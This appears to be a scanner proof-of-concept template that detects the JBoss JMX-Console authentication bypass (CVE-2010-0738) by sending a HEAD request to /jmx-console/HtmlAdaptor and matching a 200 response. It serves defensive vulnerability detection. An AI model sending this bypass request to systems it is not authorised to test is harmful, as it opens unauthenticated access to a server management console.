[info]
author = "AVE"
description = "检测 JBoss JMX-Console 认证绕过漏洞（CVE-2010-0738），通过发送非 GET/POST 的 HTTP 方法（如 HEAD）绕过仅针对 GET 和 POST 的权限校验。"
id = "POC-AVE-2010-0206"
name = "JBoss JMX-Console Authentication Bypass PoC"
severity = "medium"
tags = ["ave-2010-0206"]
vuln_id = [
    "CVE-2010-0738",
    "AVE-2010-0206",
]

[poc]
logic = "all"

[[poc.requests]]
method = "HEAD"
path = "/{{BaseURL}}/jmx-console/HtmlAdaptor"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
